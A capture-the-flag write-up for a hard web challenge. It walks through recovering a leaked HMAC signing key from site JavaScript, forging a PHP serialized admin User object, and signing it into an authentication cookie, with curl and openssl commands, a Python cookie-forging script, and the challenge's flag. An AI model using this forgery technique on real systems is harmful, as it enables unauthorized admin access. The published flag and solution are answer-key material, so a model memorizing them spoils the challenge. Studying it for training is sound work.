# Root Christmas Control

Basic challenge details:
- **Difficulty**: Hard
- **Points**: 500 (static)
- **Resources**: Click Here
- **Hints**: None

**Challenge Description**: Santa's running the Reindeer Command Center from the beach, but the control panel might not be as locked down as it looks. Holiday shortcuts, festive scripts, and trusted badges all play a role in keeping things running. Somewhere in the summer heat, a small oversight could turn a regular elf into the one calling the shots.

**Made and submitted by**: Hiruna Perera on behalf of Legion Offensive Security

## Writeup

1. Open the site (example): http://ch6.christmas.acucysctf.org/.
2. View page source and linked assets. Notably js/main.min.js was included.
3. Download and inspect the minified JS:

```
$ curl -s http://ch6.christmas.acucysctf.org/js/main.min.js -o main.min.js

$ sed -n '1,120p' main.min.js
```

Inside the file a small object was present:

```js
var _m={a:" Q2hyaXN0bWFzMjAyNQ==",b:"fleet",c:"v1"};console.log("np:init");
```

The a value is Base64. Decode it:

```bash
$ echo 'Q2hyaXN0bWFzMjAyNQ==' | base64 --decode

Christmas2025
```

The signing key has been discovered: `Christmas2025`.

Next, we with identify the authentication format.

1. Register a test user to get a sample cookie:
```bash
$ curl -i -X POST -d "username=elf" http://ch6.christmas.acucysctf.org/register.php
```

2. Inspect the Set-Cookie header. The cookie looks like:
```bash
reindeer_auth=<BASE64_PAYLOAD>.<HEX_HMAC>
```

3. The server does:
    - `base64_decode(first_part)` → raw serialized PHP string
    - `hash_hmac('sha256', $payload, SIGN_KEY)` compared to given HMAC
    - if valid: `unserialize($payload)` → User object
    - then checks `$user`->role

Craft a valid PHP serialized User object

The server defines a User class:

```php
class User {
    public $username;
    public $role = 'user';
}
```

We need a serialized object with role = "admin". Exact PHP serialization requires correct byte counts.

Payload string:

```php
O:4:"User":2:{s:8:"username";s:10:"elf_hacker";s:4:"role";s:5:"admin";}
```

Explanation:
- `O:4:"User":2:` → object of class User with 2 properties
- `s:8:"username";s:10:"elf_hacker";` → property name length 8, value length 10
- `s:4:"role";s:5:"admin";` → property name length 4, value length 5

The `s:<len>:` counts must be exact; otherwise `unserialize()` may fail or return false.

Next, let's compute HMAC-SHA256 and assemble cookie.

Compute HMAC over the raw serialized bytes (not base64). Example CLI commands:

```php
# create payload (exact bytes)
printf 'O:4:"User":2:{s:8:"username";s:10:"elf_hacker";s:4:"role";s:5:"admin";}' > payload.bin

# base64-encode payload (no newline)
B64=$(base64 -w0 payload.bin)

# compute HMAC-SHA256 hex digest using openssl
SIG=$(openssl dgst -sha256 -hmac "Christmas2025" payload.bin | awk '{print $2}')

# assembled cookie value
echo "${B64}.${SIG}"
```

Set the cookie and access `/admin.php`:

```bash
curl -i -b "reindeer_auth=${B64}.${SIG}" http://ch6.christmas.acucysctf.org/admin.php
```

If correct, the response will show the admin banner and the flag

Below is a python script automating all of this:

```python
#!/usr/bin/env python3
import base64, hmac, hashlib

# config
key = b"Christmas2025"
username = "elf_hacker"

payload = f'O:4:"User":2:{{s:8:"username";s:{len(username)}:"{username}";s:4:"role";s:5:"admin";}}'
payload_bytes = payload.encode('utf-8')

b64 = base64.b64encode(payload_bytes).decode('ascii')
sig = hmac.new(key, payload_bytes, hashlib.sha256).hexdigest()
cookie_val = f"{b64}.{sig}"

print("Serialized payload:")
print(payload)

print("\nCookie value:")
print(cookie_val)

print("\nExample curl:")
print(f"curl -i -b 'reindeer_auth={cookie_val}' http://ch6.christmas.acucysctf.org/admin.php")
```

Then edit the cookie ini browser dev tools to the newly created cookie and visit the `/admin.php` directory.

Flag: `AUCTF{0dc34631d66aacda297e1735ad56d2cc}`
